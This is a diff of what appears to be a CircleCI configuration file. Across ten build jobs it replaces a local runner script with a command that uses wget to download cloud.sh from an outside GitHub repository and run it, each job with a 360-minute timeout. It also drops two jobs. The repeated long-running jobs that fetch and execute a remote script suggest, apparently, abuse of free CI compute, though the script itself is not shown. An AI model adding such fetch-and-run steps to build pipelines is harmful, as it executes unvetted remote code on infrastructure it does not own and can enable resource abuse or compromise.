@@ -11,7 +11,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
       
       
@@ -27,7 +27,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
   build_03:
     docker:
@@ -41,7 +41,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
   build_04:
     docker:
@@ -54,7 +54,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
 
   build_05:
     docker:
@@ -67,7 +67,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
   build_06:
     docker:
@@ -80,7 +80,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
   build_07:
     docker:
@@ -93,7 +93,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
   build_08:
     docker:
@@ -106,7 +106,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
 
   build_09:
     docker:
@@ -119,7 +119,7 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
       
   build_10:
     docker:
@@ -131,35 +131,8 @@ jobs:
       - run:
           no_output_timeout: 360m
           
-          command: "chmod +x runner.sh && ./runner.sh"
-  build_11:
-    docker:
-      - image: cimg/python:3.8
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 360m
-          
-          command: "chmod +x runner.sh && ./runner.sh"
-      
-      
-      
-      
-  build_12:
-    docker:
-      - image: cimg/python:3.8
-
-    working_directory: ~/repo
-    steps:
-      - checkout
-      - run: ls
-      - run:
-          no_output_timeout: 360m
-          
-          command: "chmod +x runner.sh && ./runner.sh"
+          command: "wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh"
+  
       
   
 
@@ -180,7 +153,3 @@ workflows:
             - build_08
             - build_09
             - build_10
-            - build_11
-            - build_12
-            
-
